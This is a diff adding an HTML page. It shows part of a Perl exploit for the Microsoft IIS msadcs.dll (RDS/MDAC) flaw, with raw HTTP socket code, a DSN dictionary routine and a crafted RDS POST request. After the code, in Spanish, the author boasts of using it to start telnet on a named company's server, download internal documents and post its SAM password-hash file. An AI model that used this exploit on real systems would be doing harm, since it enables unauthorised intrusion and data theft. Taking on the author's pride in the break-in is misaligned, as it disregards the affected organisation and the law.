+<p><font face="OCR A Extended">my @results=sendraw2(make_header() . make_req(4,&quot;&quot;,&quot;&quot;));</font></p>
+<p><font face="OCR A Extended">if (rdo_success(@results)){</font></p>
+<p><font face="OCR A Extended">my $max=@results; my $c; my %d;</font></p>
+<p><font face="OCR A Extended">for($c=19; $c&lt;$max; $c++){</font></p>
+<p><font face="OCR A Extended">$results[$c]=~s/\x00//g;</font></p>
+<p><font face="OCR A Extended">$results[$c]=~s/[^a-zA-Z0-9:~ \\\._]{1,40}/\n/g;</font></p>
+<p><font face="OCR A Extended">$results[$c]=~s/[^a-zA-Z0-9:~ \\\._\n]//g;</font></p>
+<p><font face="OCR A Extended">$results[$c]=~/([a-zA-Z]\:\\)([a-zA-Z0-9 
+_~\\]+)\\/;</font></p>
+<p><font face="OCR A Extended">$d{&quot;$1$2&quot;}=&quot;&quot;;}</font></p>
+<p><font face="OCR A Extended">foreach $c (keys %d){ print &quot;$c\n&quot;; }</font></p>
+<p><font face="OCR A Extended">} else {print &quot;Index server not installed/query 
+failed\n&quot;; }}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub dsn_dict {</font></p>
+<p><font face="OCR A Extended">open(IN, &quot;&lt;$args{e}&quot;) || die(&quot;Can't open external 
+dictionary\n&quot;);</font></p>
+<p><font face="OCR A Extended">while(&lt;IN&gt;){</font></p>
+<p><font face="OCR A Extended">$hold=$_; $hold=~s/[\r\n]//g; $dSn=&quot;$hold&quot;; print 
+&quot;.&quot;;</font></p>
+<p><font face="OCR A Extended">next if (!is_access(&quot;DSN=$dSn&quot;));</font></p>
+<p><font face="OCR A Extended">if(create_table(&quot;DSN=$dSn&quot;)){</font></p>
+<p><font face="OCR A Extended">print &quot;$dSn successful\n&quot; if(!defined $args{V});</font></p>
+<p><font face="OCR A Extended">if(run_query(&quot;DSN=$dSn&quot;)){</font></p>
+<p><font face="OCR A Extended">print &quot;Success!\n&quot;; save (3,3,&quot;DSN=$dSn&quot;,&quot;&quot;); 
+exit; }}} </font></p>
+<p><font face="OCR A Extended">print &quot;\n&quot;; close(IN);}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub sendraw2 { # ripped and modded from whisker</font></p>
+<p><font face="OCR A Extended">sleep($delay); # it's a DoS on the server! At 
+least on mine...</font></p>
+<p><font face="OCR A Extended">my ($pstr)=@_;</font></p>
+<p><font face="OCR A Extended">socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) 
+||</font></p>
+<p><font face="OCR A Extended">die(&quot;Socket problems\n&quot;);</font></p>
+<p><font face="OCR A Extended">if(connect(S,pack &quot;SnA4x8&quot;,2,80,$target)){</font></p>
+<p><font face="OCR A Extended">open(OUT,&quot;&gt;raw.out&quot;); my @in;</font></p>
+<p><font face="OCR A Extended">select(S); $|=1; print $pstr; </font></p>
+<p><font face="OCR A Extended">while(&lt;S&gt;){ print OUT $_; push @in, $_; print 
+STDOUT &quot;.&quot;;}</font></p>
+<p><font face="OCR A Extended">close(OUT); select(STDOUT); close(S); return @in;</font></p>
+<p><font face="OCR A Extended">} else { die(&quot;Can't connect...\n&quot;); }}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub content_start { # this will take in the 
+server headers</font></p>
+<p><font face="OCR A Extended">my (@in)=@_; my $c;</font></p>
+<p><font face="OCR A Extended">for ($c=1;$c&lt;500;$c++) { </font></p>
+<p><font face="OCR A Extended">if($in[$c] =~/^\x0d\x0a/){</font></p>
+<p><font face="OCR A Extended">if ($in[$c+1]=~/^HTTP\/1.[01] [12]00/) { $c++; }</font></p>
+<p><font face="OCR A Extended">else { return $c+1; }}}</font></p>
+<p><font face="OCR A Extended">return -1;} # it should never get here actually
+</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub funky {</font></p>
+<p><font face="OCR A Extended">my (@in)=@_; my $error=odbc_error(@in);</font></p>
+<p><font face="OCR A Extended">if($error=~/ADO could not find the specified 
+provider/){</font></p>
+<p><font face="OCR A Extended">print &quot;\nServer returned an ADO miscofiguration 
+message\nAborting.\n&quot;;</font></p>
+<p><font face="OCR A Extended">exit;}</font></p>
+<p><font face="OCR A Extended">if($error=~/A Handler is required/){</font></p>
+<p><font face="OCR A Extended">print &quot;\nServer has custom handler filters (they 
+most likely are patched)\n&quot;;</font></p>
+<p><font face="OCR A Extended">exit;}</font></p>
+<p><font face="OCR A Extended">if($error=~/specified Handler has denied 
+Access/){</font></p>
+<p><font face="OCR A Extended">print &quot;\nADO handlers denied access (they most 
+likely are patched)\n&quot;;</font></p>
+<p><font face="OCR A Extended">exit;}}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub has_msadc {</font></p>
+<p><font face="OCR A Extended">my @results=sendraw(&quot;GET /msadc/msadcs.dll HTTP/1.0\n\n&quot;);</font></p>
+<p><font face="OCR A Extended">my $base=content_start(@results);</font></p>
+<p><font face="OCR A Extended">return if($results[$base]=~/Content-Type: 
+application\/x-varg/);</font></p>
+<p><font face="OCR A Extended">my @s=grep(&quot;Server&quot;,@results);</font></p>
+<p><font face="OCR A Extended">if($s[0]!~/IIS/){ print &quot;Doh! They're not running 
+IIS.\n&quot; }</font></p>
+<p><font face="OCR A Extended">else { print &quot;/msadc/msadcs.dll was not found.\n&quot;;}</font></p>
+<p><font face="OCR A Extended">exit;}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended">sub get_name { # this was added last minute</font></p>
+<p><font face="OCR A Extended">my $msadc=&lt;&lt;EOT</font></p>
+<p><font face="OCR A Extended">POST /msadc/msadcs.dll/VbBusObj.VbBusObjCls.GetMachineName 
+HTTP/1.1</font></p>
+<p><font face="OCR A Extended">User-Agent: ACTIVEDATA</font></p>
+<p><font face="OCR A Extended">Host: $ip</font></p>
+<p><font face="OCR A Extended">Content-Length: 126</font></p>
+<p><font face="OCR A Extended">Connection: Keep-Alive</font></p>
+<p><font face="OCR A Extended">ADCClientVersion:01.06</font></p>
+<p><font face="OCR A Extended">Content-Type: multipart/mixed; boundary=!ADM!ROX!YOUR!WORLD!; 
+num-args=0</font></p>
+<p><font face="OCR A Extended">--!ADM!ROX!YOUR!WORLD!--</font></p>
+<p><font face="OCR A Extended">EOT</font></p>
+<p><font face="OCR A Extended">; $msadc=~s/\n/\r\n/g;</font></p>
+<p><font face="OCR A Extended">my @results=sendraw($msadc);</font></p>
+<p><font face="OCR A Extended">my $base=content_start(@results);</font></p>
+<p><font face="OCR A Extended">$results[$base+6]=~s/[^-A-Za-z0-9!\@\#\$\%^\&amp;*()\[\]_=+~&lt;&gt;.,?]//g;</font></p>
+<p><font face="OCR A Extended">print &quot;Machine name: $results[$base+6]\n&quot;;}</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+<p><font face="OCR A Extended"># Note: This is not a good example of precision 
+code. It is very</font></p>
+<p><font face="OCR A Extended"># redundant and has a few kludges. I have been 
+adding features in one at</font></p>
+<p><font face="OCR A Extended"># at a time, so it has resulted in redundant 
+functions and patched code.</font></p>
+<p><font face="OCR A Extended"># I will be rewriting it in the future, sometime. 
+Look for the newer code</font></p>
+<p><font face="OCR A Extended"># revisions at www.technotronic.com/rfp/</font></p>
+<p><font face="OCR A Extended"># This may also be included in the NT-PTK/P. If 
+you don't know what that</font></p>
+<p><font face="OCR A Extended"># is, just wait and see. :)</font></p>
+<p><font face="OCR A Extended">
+##############################################################################</font></p>
+</font>
+<p><font face="OCR A Extended">-----------------------------hasta aca-----------------------------------------------</font></p>
+<p><font face="OCR A Extended">gracias a este exploit le prendí el telnet</font></p>
+<p><font face="OCR A Extended">net start telnet</font></p>
+<p><font face="OCR A Extended">y vi sus <a href="bull.aisle.txt">dirs</a></font></p>
+<p><font face="OCR A Extended">En este server había un montón de info importante 
+archivos .doc, .xls, .ppt yo me baje varios pero uno de los destacados era el 
+que decía <a href="proyecto_venezuela.doc">proyecto venezuela</a></font></p>
+<p><font face="OCR A Extended">y ya que hice 30 bueno hice 31 .....aquí esta el
+<a href="SAM">sam._</a></font></p>
+<p><font face="OCR A Extended">Actualmente bull-ti no usa mas iis lo cambiaron 
+por otro.</font></p>
+<p><font face="OCR A Extended">bueno esto fue mi visita por la empresa bull me 
+voy despiendo de sus server para no volver nunca mas... </font></p>
+<p>&nbsp;</p>
+<p>
+______________________________________________________________________________________________________________</p>
+<p><font face="OCR A Extended">Written by gordian_knot from aisle.</font></p>
+<p><font face="OCR A Extended">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</font></p>
+
+</body>
+
+</html>
